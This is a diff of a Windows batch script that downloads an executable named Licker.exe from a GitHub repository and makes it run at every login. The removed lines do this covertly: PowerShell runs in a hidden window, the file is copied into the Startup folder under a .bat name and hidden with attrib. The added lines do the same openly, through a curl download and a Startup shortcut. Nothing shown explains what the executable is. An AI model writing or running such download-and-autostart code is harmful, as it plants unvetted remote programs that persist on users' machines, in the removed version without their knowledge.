@@ -1,11 +1,20 @@
 @echo off
+:: 1. Define paths
+set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
+set "SAVE_PATH=%USERPROFILE%\Licker.exe"
+set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"
 
-powershell -WindowStyle Hidden -Command ^
-"$url='https://github.com/sankarideb1-hue/Lickers/raw/refs/heads/main/Licker.exe; ^
- $file='$env:TEMP\auto_install.bat'; ^
- curl.exe -L $url -o $file; ^
- if (Test-Path $file) { ^
-   $startup = '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\LICKER.bat'; ^
-   Copy-Item $file $startup -Force; ^
-   attrib +h $startup; ^
- }"
+echo Downloading Licker...
+:: 2. Use curl to download the file to the user's profile folder
+curl -L %EXE_URL% -o "%SAVE_PATH%"
+
+if exist "%SAVE_PATH%" (
+    echo Creating startup shortcut...
+    :: 3. Create a shortcut in the Startup folder using PowerShell
+    powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_LINK%');$s.TargetPath='%SAVE_PATH%';$s.Save()"
+    echo Setup complete! Licker will run at next login.
+) else (
+    echo Download failed. Please check your internet connection.
+)
+
+pause
